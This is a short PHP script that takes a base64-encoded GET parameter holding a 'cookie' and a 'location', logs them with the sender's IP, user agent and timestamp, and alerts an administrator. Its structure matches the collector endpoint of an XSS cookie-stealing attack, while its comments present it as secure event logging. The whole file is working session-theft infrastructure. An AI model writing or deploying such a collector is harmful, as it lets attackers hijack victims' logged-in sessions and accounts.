<?php

// Decode, sanitize, and validate incoming data
function sanitize($data) {
    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
}

// Retrieve and decode the base64-encoded data
$data_encoded = $_GET['data'] ?? '';
$decoded_data = base64_decode($data_encoded);
parse_str($decoded_data, $data_array); // Parses the decoded data into an associative array

// Apply sanitization and validation to decoded data
$cookie = sanitize($data_array['cookie'] ?? '');
$location = sanitize($data_array['location'] ?? '');

// Prepare data for logging and notification
$data = [
    'cookie' => $cookie,
    'location' => $location,
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'timestamp' => date('Y-m-d H:i:s')
];

// Write to log file securely
file_put_contents('../logs/events.log', json_encode($data) . PHP_EOL, FILE_APPEND);

// Call the notifier script for alerting
require_once 'notifier.php';
notifyAdmin($data);

echo "OK";
?>
